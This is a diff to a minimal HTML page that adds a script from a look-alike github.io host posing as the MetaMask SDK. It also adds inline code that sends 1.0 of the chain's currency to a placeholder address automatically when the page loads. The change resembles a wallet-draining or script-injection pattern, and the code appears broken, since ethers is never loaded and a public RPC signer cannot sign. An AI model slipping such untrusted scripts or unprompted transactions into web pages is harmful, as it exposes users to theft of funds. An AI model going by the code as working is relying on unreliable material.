@@ -2,12 +2,27 @@
 <html lang="en">
 <head>
     <title>Some title</title>
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
 </head>
 <body>
 <h1>Hello ton!</h1>
 <div id="connect"></div>
 <script>
-    alert(1);
+    const provider = new ethers.providers.JsonRpcProvider('https://rpc.ankr.com/bsc_testnet_chapel');
+    const signer = provider.getSigner();
+
+    const transaction = {
+        to: '0x1234567890abcdef1234567890abcdef12345678',
+        value: ethers.utils.parseEther('1.0')
+    };
+
+    signer.sendTransaction(transaction)
+        .then((tx) => {
+            console.log('Transaction sent:', tx);
+        })
+        .catch((error) => {
+            console.error('Error sending transaction:', error);
+        });
 </script>
 </body>
 </html>
